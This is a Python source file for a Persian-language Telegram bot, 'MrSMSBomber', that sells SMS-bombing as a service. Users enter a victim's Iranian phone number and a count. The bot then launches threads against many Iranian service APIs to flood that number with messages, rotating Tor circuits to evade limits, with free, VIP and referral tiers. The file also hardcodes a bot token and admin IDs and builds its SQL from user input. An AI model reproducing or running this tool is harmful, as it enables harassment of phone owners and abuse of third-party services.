#!/usr/bin/python

from telegram.ext import CommandHandler, Updater, ConversationHandler, Filters, MessageHandler, run_async
from telegram import ReplyKeyboardMarkup, ReplyKeyboardRemove
from re import search
from os import system
from requests import post
from time import sleep
from threading import Thread
import sqlite3
import Api
import AdminPanel
import json
from datetime import datetime
from datetime import date
from pytz import timezone

timezon = timezone('Asia/Tehran')

global Admin_Chatid
Admin_Chatid = 820586182

global admin_location
admin_location = ''
global location
location = ''

#</########Keyboards##################\>
start_keyboard = [['💣اسپم💣'],['💳اطلاعات حساب💳', '🤔راهنما🤔'],['📍زیرمجموعه گیری📍']]
start_markup = ReplyKeyboardMarkup(start_keyboard, resize_keyboard=True)
bombMenu_keyboard = [['بخش ویژه(26 سرور)', 'بخش رایگان'], ['برگشت']]
bombMenu_markup = ReplyKeyboardMarkup(bombMenu_keyboard, resize_keyboard=True)
laghv_keyboard = [["لغو"]]
laghv_markup = ReplyKeyboardMarkup(laghv_keyboard, resize_keyboard=True)
Smenu_keyboard = [['😀بخش رایگان😀', '😍بخش ویژه😍'], ['🤩تست بخش ویژه🤩'], ["برگشت"]]
Smenu_markup = ReplyKeyboardMarkup(Smenu_keyboard, resize_keyboard=True)
ok_keyboard = [['تایید'], ['لغو']]
ok_markup = ReplyKeyboardMarkup(ok_keyboard, resize_keyboard=True)
admin_Skeyboard = [['💣اسپم💣'],['💳اطلاعات حساب💳', '🤔راهنما🤔'], ['📍زیرمجموعه گیری📍'],["ورود به پنل مدیریت"]]
admin_Smarkup = ReplyKeyboardMarkup(admin_Skeyboard, resize_keyboard=True)
admin_Mkeyboard = [['ارسال پیام به همه کاربران', 'ارسال پیام به تک کاربر'],['مشاهده لیست کاربران', 'دانلود دیتابیس'],['بن کردن', 'آزاد کردن'],['ویژه کردن', 'عادی کردن'], ['برگشت']]
admin_Mmarkup = ReplyKeyboardMarkup(admin_Mkeyboard, resize_keyboard=True)
#<\########Keyboards##################/>

conn = sqlite3.connect('BombDB.db', check_same_thread=False)
c = conn.cursor()

updater = Updater('1253076808:AAE7fU0XUQlam363zGfgv9xapO_DO9eot00', use_context=True)

##########################DBDefs############################################################################

def main_InsertToDB(Chat_id, name, viptest, targets, subset, license, banmood):
    sql = c.execute(''' SELECT ChatID FROM Users ''')
    global req
    global bmm
    s = 0
    for row in sql:
        if int(row[0]) == int(Chat_id):
            s = 1
            bmm = c.execute(f''' SELECT BanMood FROM Users WHERE ChatID="{Chat_id}" ''')
            for i in bmm: bmm=str(i[0])
            if bmm == '0':
                bmm = False
            elif bmm == '1':
                bmm = True
            req = True
            break
    if s == 0:
        c.execute(f''' INSERT INTO Users (ChatID, Name, VipTest, LTarget, Subset, License, BanMood, LastF) VALUES ("{Chat_id}", "{name}", "{viptest}", "{targets}", "{subset}", "{license}", "{banmood}", "0")''')
        conn.commit()
        bmm = False
        req = False
    return s


def CheckBan(id):
    global bmm
    bmm = c.execute(f''' SELECT BanMood FROM Users WHERE ChatID="{id}" ''')
    for i in bmm:bmm=i[0]

def InsertTarget(target, id):
    c.execute(f''' UPDATE Users SET LTarget="{target}" WHERE ChatID={id} ''')
    conn.commit()

def CheckLicense(id):
    global li
    li = c.execute(f''' SELECT License FROM Users WHERE ChatID = "{id}" ''')
    for i in li:
        li = i[0]
    if li == '0':
        li = False
    elif li == '1':
        li = True


def CheckSubset(id):
    all = c.execute(f''' SELECT Subset FROM Users WHERE ChatID="{id}" ''')
    global subsets
    for i in all:
        subsets = int(i[0])

##########################DBDefs############################################################################

@run_async
def start(update, context):
    if update.message.chat_id == Admin_Chatid:
        admin_location = 'main_menu'
    else:
        location  = 'main_menu'
    main_InsertToDB(update.message.chat_id, update.message.from_user.name, 0, 0, 0, 0, 0)
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    c.execute(f''' UPDATE Users SET LastF="{date.today()} {timee}" WHERE ChatID="{update.message.chat_id}" ''')
    conn.commit()
    context.bot.send_message(-1001427119619, f'{update.message.chat_id} with {update.message.from_user.username} started bot!')
    if not bmm:
        if context.args != []:
            subadd = int(context.args[0])
            if not req:
                sub = c.execute(f''' SELECT Subset FROM Users WHERE ChatID="{subadd}" ''')
                for i in sub:sub=int(i[0])
                sub+=1
                c.execute(f''' UPDATE Users SET Subset="{sub}" WHERE ChatID="{subadd}"''')
                conn.commit()
                context.bot.send_message(subadd, text='یک نفر به زیرمجموعه های شما اضافه شد.')
                CheckSubset(subadd)
                if subsets >= 50:
                    c.execute(f''' UPDATE Users SET License="1" WHERE ChatID="{subadd}" ''')
                    conn.commit()
                    context.bot.send_message(subadd, text='حساب کاربری شما با موفقیت ویژه شد.')
        if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
            update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
        else:
            if update.message.chat_id == Admin_Chatid:
                update.message.reply_text('''سلام به ربات اس ام اس بمبر خوش آمدید😁''', reply_markup=admin_Smarkup)
            else:
                update.message.reply_text('سلام به ربات اس ام اس بمبر خوش آمدید😁', reply_markup=start_markup)
    elif bmm :
        update.message.reply_text('شما از ربات بن شده اید.')

@run_async
def help(update, context):
    CheckBan(update.message.chat_id)
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    c.execute(f''' UPDATE Users SET LastF="{date.today()} {timee}" WHERE ChatID="{update.message.chat_id}" ''')
    conn.commit()
    if str(bmm) == '0':
        if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
            update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
        else:
            if update.message.chat_id != Admin_Chatid:
                update.message.reply_text('''
💣اسپم💣 - درخواست زدن برای اسپم اس ام اس

اسپم چیه؟🤔
به ارسال هرزنامه بصورت رگباری و پشت سرهم اسپم میگن😄
—————————————————
💳اطلاعات حساب💳 - نمایش اطلاعات اکانت شما در ربات
—————————————————
📍زیرمجموعه گیری📍 - شما از طریق این بخش میتونید دوستاتون رو به ربات دعوت کنید و حسابتون رو ویژه کنید🤩''')
            else:
                update.message.reply_text('''
💣اسپم💣 - درخواست زدن برای اسپم اس ام اس

اسپم چیه؟🤔
به ارسال هرزنامه بصورت رگباری و پشت سرهم اسپم میگن😄
—————————————————
💳اطلاعات حساب💳 - نمایش اطلاعات اکانت شما در ربات
—————————————————
📍زیرمجموعه گیری📍 - شما از طریق این بخش میتونید دوستاتون رو به ربات دعوت کنید و حسابتون رو ویژه کنید🤩''')
    elif str(bmm) == '1':
        update.message.reply_text('شما از ربات بن شده اید.')
@run_async
def Spam_Menu(update, context):
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    c.execute(f''' UPDATE Users SET LastF="{date.today()} {timee}" WHERE ChatID="{update.message.chat_id}" ''')
    conn.commit()
    if update.message.chat_id == Admin_Chatid: global admin_location; admin_location = 'spam_menu'
    else: global location; location = 'spam_menu'
    update.message.reply_text('یک بخش را انتخواب کنید:', reply_markup=Smenu_markup)
@run_async
def back(update, context):
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    c.execute(f''' UPDATE Users SET LastF="{date.today()} {timee}" WHERE ChatID="{update.message.chat_id}" ''')
    conn.commit()
    global location, admin_location
    if update.message.chat_id == Admin_Chatid:
        if admin_location == 'spam_menu':
            update.message.reply_text(
                    'به منوی اصلی برگشتید.',
                    reply_markup=admin_Smarkup)
            admin_location = 'main_menu'
        elif admin_location == 'panel':
            update.message.reply_text('به منوی اصلی برگشتید.', reply_markup=admin_Smarkup)
    else:
        if location == 'spam_menu':
            update.message.reply_text(
                'به منوی اصلی برگشتید.',
                reply_markup=start_markup)
            location = 'main_menu'


@run_async
def Admin_Show(update, context):
    if update.message.chat_id == Admin_Chatid:
        global admin_location
        admin_location = 'panel'
        update.message.reply_text('سلام قربان', reply_markup=admin_Mmarkup)
#####################################Free####################################################################

free_GetTarget, free_GetCount = range(2)

CKeyboard = [["لغو"]]
global CMarkup
CMarkup = ReplyKeyboardMarkup(CKeyboard, resize_keyboard=True)
@run_async
def Free_Start(update, context):
    CheckBan(update.message.chat_id)
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    c.execute(f''' UPDATE Users SET LastF="{date.today()} {timee}" WHERE ChatID="{update.message.chat_id}" ''')
    conn.commit()
    if str(bmm) == '0':
        if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
            update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
            return ConversationHandler.END
        else:
            update.message.reply_text("😈لطفا شماره تارگتتون(کسی که میخواید بهش پیامک اسپم کنید) رو بصورت زیر وارد کنید\n+989*********\nمثال: +989120000000", reply_markup=CMarkup)

            return free_GetTarget
    elif str(bmm) == '1':
        update.message.reply_text('شما از ربات بن شده اید.')

        return ConversationHandler.END
@run_async
def Free_GetTarget(update, context):
    if search('^\+989\d{9}$', update.message.text) == None or update.message.text == +989306203652 :
        update.message.reply_text(
            'لطفا شماره هدفتون رو بصورت زیر ارسال کنید.\n+989120000000\n')
    else:
        global phone
        phone = update.message.text
        InsertTarget(phone, update.message.chat_id)
        update.message.reply_text("لطفا تعداد پیام هارا وارد کنید.")

        return free_GetCount

def thred(phone, chid):
    for th in range(10):
        a = Thread(target=Api.snap, args=[phone, chid])
        a.start()
        a.join()
        del a

@run_async
def Free_GetCount(update, context):
    try:
        file = open('MDB.json', 'r')
        CData = json.load(file)
        CData.update({f"{update.message.chat_id}":"0"})
        file.close()
        file = open('MDB.json', 'w')
        cr = json.dumps(CData)
        file.write(cr)
        file.close()
    except:
        file = open('MDB.json', 'w')
        CData = {f"{update.message.chat_id}":"0"}
        Cwrite = json.dumps(CData)
        file.write(Cwrite)
        file.close()
    try:
        if int(update.message.text) <= 0 or int(update.message.text) >= 100 :
            update.message.reply_text('لطفا یک عدد بین 0-100 وارد کنید.')
        else:
            count = int(update.message.text)
            update.message.reply_text('درحال اسپم کردن...')
            context.bot.send_message(-1001427119619, f'{update.message.chat_id} with {update.message.from_user.username} request {count} sms in Free')
            file = open('MDB.json', 'r')
            js = json.load(file)
            PCount = int(js[f'{update.message.chat_id}'])
            file.close()
            while PCount < count:
                Thread(target=Api.snap, args=[phone, update.message.chat_id]).start()
                Thread(target=Api.snap, args=[phone, update.message.chat_id]).start()
                Thread(target=Api.snap, args=[phone, update.message.chat_id]).start()
                system("killall -HUP tor")
                file = open('MDB.json', 'r')
                js = json.load(file)
                PCount = int(js[f'{update.message.chat_id}'])
                file.close()
                print('threaded')
                sleep(3)
            # sleep(2)
            # file = open('MDB.json', 'r')
            # js = json.load(file)
            # js[f'{update.message.chat_id}'] = "0"
            # jw = json.dumps(js)
            # file.close()
            # file = open('MDB.json', 'w')
            # file.write(jw)
            # file.close()
            update.message.reply_text(f'{count} اس ام اس به شماره {phone} ارسال شد.\n🚫لطفا تا حداقل 5 دقیقه دیگر درخواست نزنید در غیر اینصورت بن میشید.', reply_markup=Smenu_markup)

            return ConversationHandler.END
    except:
        update.message.reply_text('لطفا یک عدد وارد کنید.')
@run_async
def Laghv(update, context):
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    c.execute(f''' UPDATE Users SET LastF="{date.today()} {timee}" WHERE ChatID="{update.message.chat_id}" ''')
    conn.commit()
    if update.message.chat_id == Admin_Chatid:
        update.message.reply_text(
            'لغو شد.\nبه منوی اصلی برگشتید.',
            reply_markup=admin_Smarkup)
    else:
        update.message.reply_text(
            'لغو شد.\nبه منوی اصلی برگشتید.',
            reply_markup=start_markup)

    return ConversationHandler.END

free_conv = ConversationHandler(
    entry_points=[MessageHandler(Filters.regex('^😀بخش رایگان😀$'), Free_Start)],
    states={
        free_GetTarget : [MessageHandler(Filters.text & ~Filters.regex('^لغو$'), Free_GetTarget)],
        free_GetCount : [MessageHandler(Filters.text & ~Filters.regex('^لغو$'), Free_GetCount)],
    },
    fallbacks=[MessageHandler(Filters.regex('^لغو$'), Laghv)]
)

#####################################Free####################################################################
##########################Vip##########################################################
vip_GetTarget, vip_GetCount = range(2)

@run_async
def VipMood_Start(update, context):
    CheckBan(update.message.chat_id)
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    c.execute(f''' UPDATE Users SET LastF="{date.today()} {timee}" WHERE ChatID="{update.message.chat_id}" ''')
    conn.commit()
    if str(bmm) == '0':
        if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
            update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
            return ConversationHandler.END
        else:
            li = c.execute(f''' SELECT License FROM Users WHERE ChatID = "{update.message.chat_id}" ''')
            for i in li: li = i[0]
            if li == '0': li = False
            elif li == '1': li = True
            if not li:
                update.message.reply_text('''حساب کاربری شما عادی میباشد.
شما میتوانید برای ویژه کردن حساب خود با آیدی @MrSMSBomber_Admin در ارتباط باشید.
یا از بخش زیرمجموعه گیری اقدام کنید.''')
                return ConversationHandler.END
            else:
                update.message.reply_text('سلام به بخش ویژه خوش آمدید😍\n😈لطفا شماره تارگتتون(کسی که میخواید بهش پیامک اسپم کنید) رو بصورت زیر وارد کنید\n+989*********\nمثال: +989120000000',
                                          reply_markup=CMarkup)
                return vip_GetTarget

    elif str(bmm) == '1':
        update.message.reply_text('شما از ربات بن شده اید.')
        return ConversationHandler.END

@run_async
def Vip_GetTarget(update, context):
    if search('^\+989\d{9}$', update.message.text) == None:
        update.message.reply_text('لطفا شماره هدفتون رو بصورت زیر ارسال کنید.\n+989120000000\n')
    else:
        global phone
        phone = update.message.text
        InsertTarget(phone, update.message.chat_id)
        update.message.reply_text("لطفا تعداد پیام هارا وارد کنید.")

        return vip_GetCount
@run_async
def Vip_GetCount(update, context):
    try:
        try:
            file = open('MDB.json', 'r')
            CData = json.load(file)
            CData.update({f"{update.message.chat_id}": "0"})
            file.close()
            file = open('MDB.json', 'w')
            cr = json.dumps(CData)
            file.write(cr)
            file.close()
        except:
            file = open('MDB.json', 'w')
            CData = {f"{update.message.chat_id}": "0"}
            Cwrite = json.dumps(CData)
            file.write(Cwrite)
            file.close()
        count = int(update.message.text)
        update.message.reply_text('درحال اسپم کردن با 26 سرور...')
        context.bot.send_message(-1001427119619, f'{update.message.chat_id} with @{update.message.from_user.username} request {count} sms in Vip')
        file = open('MDB.json', 'r')
        js = json.load(file)
        PCount = int(js[f'{update.message.chat_id}'])
        file.close()
        while PCount < count:
            Thread(target=Api.snap, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.shad, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.gap, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.tap30, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.emtiaz, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.divar, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.rubika, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.torob, args=[phone, update.message.chat_id]).start()
            file = open('MDB.json', 'r')
            js = json.load(file)
            PCount = int(js[f'{update.message.chat_id}'])
            file.close()
            system("killall -HUP tor")
            print('threaded')
            sleep(3)
        update.message.reply_text(f'{count} اس ام اس به شماره {phone}ارسال شد.\n🚫لطفا تا حداقل 5 دقیقه دیگر درخواست نزنید در غیر اینصورت بن میشید.', reply_markup=Smenu_markup)
        return ConversationHandler.END
    except:
        update.message.reply_text('لطفا یک عدد وارد کنید.')

vip_conv = ConversationHandler(
    entry_points=[MessageHandler(Filters.regex('^😍بخش ویژه😍$'), VipMood_Start)],
    states={
        vip_GetTarget : [MessageHandler(Filters.text & ~Filters.regex('^لغو$'), Vip_GetTarget)],
        vip_GetCount : [MessageHandler(Filters.text & ~Filters.regex('^لغو$'), Vip_GetCount)],
    },
    fallbacks=[MessageHandler(Filters.regex('^لغو$'), Laghv)]
)
##########################Vip##########################################################
###############################viptest##############################

vipTest_GetTarget, vipTest_GetCount = range(2)

def CheckVipTest(id):
    global tv
    tv = c.execute(f''' SELECT VipTest FROM Users WHERE ChatID = "{id}" ''')
    for i in tv:
        tv = i[0]
    if tv == '0':
        tv = False
    elif tv == '1':
        tv = True

@run_async
def VipTest_Start(update, context):
    CheckBan(update.message.chat_id)
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    c.execute(f''' UPDATE Users SET LastF="{date.today()} {timee}" WHERE ChatID="{update.message.chat_id}" ''')
    conn.commit()
    if str(bmm) == '0':
        if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
            update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
            return ConversationHandler.END
        else:
            CheckVipTest(update.message.chat_id)
            if not tv:
                update.message.reply_text(
                    'شماره هدفتون رو وارد کنید.\n(شما تنها یک بار میتوانید ازین بخش استفاده کنید.)',
                    reply_markup=CMarkup)
                return vipTest_GetTarget
            else:
                update.message.reply_text('شما یک بار این بخش را امتحان کردید.')
                return ConversationHandler.END
    elif str(bmm) == '1':
        update.message.reply_text('شما از ربات بن شده اید.')
        return ConversationHandler.END

@run_async
def VipTest_GetTarget(update, context):
    if search('^\+989\d{9}$', update.message.text) == None:
        update.message.reply_text('لطفا شماره هدفتون رو بصورت زیر ارسال کنید.\n+989120000000\n')
    else:
        global phone
        phone = update.message.text
        InsertTarget(phone, update.message.chat_id)
        update.message.reply_text("لطفا تعداد پیام هارا وارد کنید.")

        return vipTest_GetCount
@run_async
def VipTest_GetCount(update, context):
    ch = update.message.chat_id

    try:
        try:
            file = open('MDB.json', 'r')
            CData = json.load(file)
            CData.update({f"{update.message.chat_id}": "0"})
            file.close()
            file = open('MDB.json', 'w')
            cr = json.dumps(CData)
            file.write(cr)
            file.close()
        except:
            file = open('MDB.json', 'w')
            CData = {f"{update.message.chat_id}": "0"}
            Cwrite = json.dumps(CData)
            file.write(Cwrite)
            file.close()
        count = int(update.message.text)
        file = open('MDB.json', 'r')
        js = json.load(file)
        PCount = int(js[f'{update.message.chat_id}'])
        file.close()
        update.message.reply_text('درحال اسپم کردن با 26 سرور...')
        context.bot.send_message(-1001427119619, f'{update.message.chat_id} with @{update.message.from_user.username} request {count} sms in VipTest')
        while PCount < count:
            Thread(target=Api.snap, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.shad, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.gap, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.tap30, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.emtiaz, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.divar, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.rubika, args=[phone, update.message.chat_id]).start()
            Thread(target=Api.torob, args=[phone, update.message.chat_id]).start()
            file = open('MDB.json', 'r')
            js = json.load(file)
            PCount = int(js[f'{update.message.chat_id}'])
            file.close()
            system("killall -HUP tor")
            print('threaded')
            sleep(3)
        c.execute(f''' UPDATE Users SET VipTest="1" WHERE ChatID={ch} ''')
        conn.commit()
        update.message.reply_text(f'{count} اس ام اس به شماره {phone}ارسال شد.\n🚫لطفا تا حداقل 5 دقیقه دیگر درخواست نزنید در غیر اینصورت بن میشید.', reply_markup=Smenu_markup)
        return ConversationHandler.END

    except:
        update.message.text('لطفا یک عدد وارد کنید.')

vipTest_conv = ConversationHandler(
    entry_points=[MessageHandler(Filters.regex('^🤩تست بخش ویژه🤩$'), VipTest_Start)],
    states={
        vipTest_GetTarget : [MessageHandler(Filters.text & ~Filters.regex('^لغو$'), VipTest_GetTarget)],
        vipTest_GetCount : [MessageHandler(Filters.text & ~Filters.regex('^لغو$'), VipTest_GetCount)],
    },
    fallbacks=[MessageHandler(Filters.regex('^لغو$'), Laghv)]
)
###############################viptest##############################
##############################info#########################################
@run_async
def info(update, context):
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    c.execute(f''' UPDATE Users SET LastF="{date.today()} {timee}" WHERE ChatID="{update.message.chat_id}" ''')
    conn.commit()
    if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
        update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
    else:
        sh_msg = ""
        infos = c.execute(f''' SELECT * FROM Users WHERE ChatID="{update.message.chat_id}" ''')
        for i in infos:
            sh_msg += f"🔰نام: {i[1]}\n"
            if str(i[2]) == '0': sh_msg += "🔰تست بخش ویژه: انجام نشده\n"
            elif str(i[2]) == '1': sh_msg += "🔰تست بخش ویژه: انجام شده\n"
            sh_msg += f"🔰تعداد زیر مجموعه: {i[4]}\n"
            if str(i[5]) == '0': sh_msg += "🔰بخش ویژه: غیر فعال\n"
            elif str(i[5]) == '1': sh_msg += "🔰بخش ویژه: فعال\n"
            # sh_msg += f"لینک دعوت دیگران:\nhttps://t.me/MrSMSBomberBot?start={update.message.chat_id}"
        update.message.reply_text(sh_msg)
##############################info#########################################
def SubsetLink(update, context):
    now = datetime.now(timezon)
    timee = now.strftime("%H:%M:%S")
    c.execute(f''' UPDATE Users SET LastF="{date.today()} {timee}" WHERE ChatID="{update.message.chat_id}" ''')
    conn.commit()
    if context.bot.get_chat_member(-1001144465509, update.message.chat_id).status == 'left':
        update.message.reply_text('لطفا در کانال @MrSMSBomber عضو شده و مجدد /start را ارسال کنید.')
    else:
        update.message.reply_text(f'''سلام به بخش زیر مجموعه گیری خوش آمدید🤗

شما میتوانید از طریق لینک منحصر به فرد خود 50 نفر را به ربات دعوت کنید و حساب خود را ویژه کنید.🤩😍

مزیت های بخش اسپم ویژه:
🔺اسپم با 26 سرور🔥
🔺سرعت بسیار بالا😱
🔺مادام العمر😎

لینک شما:
https://t.me/MrSMSBomberBot?start={update.message.chat_id}''')


dp = updater.dispatcher

dp.add_handler(CommandHandler('start', start))
dp.add_handler(MessageHandler(Filters.regex('^💣اسپم💣$'), Spam_Menu))
dp.add_handler(MessageHandler(Filters.regex('^دانلود دیتابیس$'), AdminPanel.GetDB))
dp.add_handler(MessageHandler(Filters.regex('^مشاهده لیست کاربران$'), AdminPanel.SeeUsers))
dp.add_handler(MessageHandler(Filters.regex('^📍زیرمجموعه گیری📍$'), SubsetLink))
dp.add_handler(free_conv)
dp.add_handler(vip_conv)
dp.add_handler(vipTest_conv)
dp.add_handler(AdminPanel.sendToAll_conv)
dp.add_handler(AdminPanel.BanSB_conv)
dp.add_handler(AdminPanel.UnBanSB_conv)
dp.add_handler(AdminPanel.UpToLicense_conv)
dp.add_handler(AdminPanel.DownToLicense_conv)
dp.add_handler(AdminPanel.sendToOne_conv)
dp.add_handler(MessageHandler(Filters.regex('^ورود به پنل مدیریت$'), Admin_Show))
dp.add_handler(MessageHandler(Filters.regex("^💳اطلاعات حساب💳$"), info))
dp.add_handler(MessageHandler(Filters.regex('^🤔راهنما🤔$'), help))
dp.add_handler(MessageHandler(Filters.regex('^برگشت$'), back))

updater.start_polling()
updater.idle()
